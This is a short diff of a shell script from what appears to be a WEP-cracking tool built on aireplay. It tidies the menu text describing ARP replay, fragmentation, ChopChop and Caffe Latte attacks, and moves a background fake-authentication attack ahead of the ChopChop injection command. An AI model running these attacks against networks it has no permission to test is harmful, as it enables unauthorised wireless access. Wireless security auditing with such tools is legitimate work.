@@ -37,11 +37,12 @@ wep_attacks_menu(){
 		"${red}ARP Replay${end}\n" \
 		"Standard arp replay, tries to capture an arp and send it back to the router to generate traffic. If not client selected, it'll launch a fake auth attack to simulate one \n"\
 		"${red}Fragmentation ${end}\n"\
-		"Initiates a fragmentation attack to obtain 1500 bytes of PRGA. Then it generates a packet and injects it back to the router.\n"\ 
+		"Initiates a fragmentation attack to obtain 1500 bytes of PRGA. Then it generates a packet and injects it back to the router.\n"\
 		"${red}ChopChop  ${end}\n"\
 		"Tries to decode a single wep packet via chopchop attack, then it starts an injection attack with that packet.\n"\
 		"${red}Caffe Latte${end}\n"\
 		"An attack not requering router to be in range, client-directed (useful if you're not close to the ap, but to a client)"
+
 
     while true; do $clear 
 	    mkmenu "Attacks using a client"\
@@ -121,9 +122,9 @@ wep_attacks_chopchop(){
 	hardclean replay_dec-*.xor
 
 	[[ $directed != 1 ]] && {
+		auth_attacks_fake &
 		export wait_for_execute=1; execute "Chopchoping at $Host_SSID"\
 			$AIREPLAY --chopchop -b $Host_MAC -h $FAKE_MAC $iwifi  
-			auth_attacks_fake &
 		export wait_for_execute=0;
 	} || {
 		export wait_for_execute=1; 
